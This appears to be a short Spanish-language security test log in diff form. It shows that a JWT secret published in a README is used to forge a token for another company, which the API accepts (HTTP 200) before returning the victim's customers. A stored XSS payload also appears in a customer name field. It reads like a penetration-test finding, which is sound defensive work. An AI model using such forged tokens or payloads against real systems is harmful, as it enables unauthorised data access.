@@ -1,0 +1,7 @@
+README.md publica JWT_SECRET = 0d1d8132f0…fbd0e8
+Token fabricado para empresaId=7: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c3Vhcml…
+# GET /clientes con el token falsificado
+> GET /clientes/search?name=   [con token]
+< HTTP 200  (6 ms)
+  [{"id":"31","nombre":"<img src=x onerror=alert(document.domain)>","correo":"xss_2b4ed9@qa.test","telefono":null,"direccion":null,"es_empresa":false,"rut":null,"nombre_fantasia":nul
+=> La API acepta el token falsificado (HTTP 200) y entrega 2 clientes de la víctima
